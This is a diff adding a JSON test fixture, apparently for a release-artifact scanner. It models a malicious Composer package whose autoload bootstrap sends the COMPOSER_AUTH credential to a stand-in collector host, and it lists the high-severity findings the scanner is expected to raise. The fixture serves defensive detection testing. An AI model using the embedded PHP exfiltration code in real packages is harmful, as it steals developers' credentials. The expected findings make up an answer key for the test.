@@ -1,0 +1,71 @@
+{
+  "id": "composer-autoload-files-exfil",
+  "title": "new autoload.files bootstrap exfiltrates credentials",
+  "category": "load-time-execution",
+  "intent": "a new autoload.files entry runs on every autoloader load; the bootstrap reads env credentials and posts them out",
+  "manifest": {
+    "schema": "drydock.release-artifacts.v1",
+    "ecosystem": "composer",
+    "package": "acme/demo-package",
+    "version": "1.2.0",
+    "artifacts": [
+      {
+        "path": "dist/demo-package-1.2.0.zip",
+        "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+      }
+    ]
+  },
+  "artifacts": [
+    {
+      "path": "dist/demo-package-1.2.0.zip",
+      "files": [
+        {
+          "path": "composer.json",
+          "size": 160,
+          "sha256": "1111111111111111111111111111111111111111111111111111111111111111",
+          "flags": [],
+          "textSample": "{\"name\": \"acme/demo-package\", \"version\": \"1.2.0\", \"autoload\": {\"files\": [\"src/bootstrap.php\"]}}"
+        },
+        {
+          "path": "src/bootstrap.php",
+          "size": 180,
+          "sha256": "2222222222222222222222222222222222222222222222222222222222222222",
+          "flags": [],
+          "textSample": "<?php\n$token = getenv(\"COMPOSER_AUTH\");\n$ch = curl_init(\"https://collector.example.com/v1\");\ncurl_setopt($ch, CURLOPT_POSTFIELDS, $token);\ncurl_exec($ch);\n"
+        }
+      ]
+    }
+  ],
+  "previousArtifacts": [
+    {
+      "path": "baseline-1.1.0.zip",
+      "files": [
+        {
+          "path": "composer.json",
+          "size": 110,
+          "sha256": "3333333333333333333333333333333333333333333333333333333333333333",
+          "flags": [],
+          "textSample": "{\"name\": \"acme/demo-package\", \"version\": \"1.1.0\"}"
+        }
+      ]
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "composer.autoload-files",
+      "severity": "high",
+      "file": "dist/demo-package-1.2.0.zip/composer.json"
+    },
+    {
+      "ruleId": "code.credential-access",
+      "severity": "high",
+      "file": "src/bootstrap.php"
+    },
+    {
+      "ruleId": "code.network-access",
+      "severity": "high",
+      "file": "src/bootstrap.php"
+    }
+  ]
+}
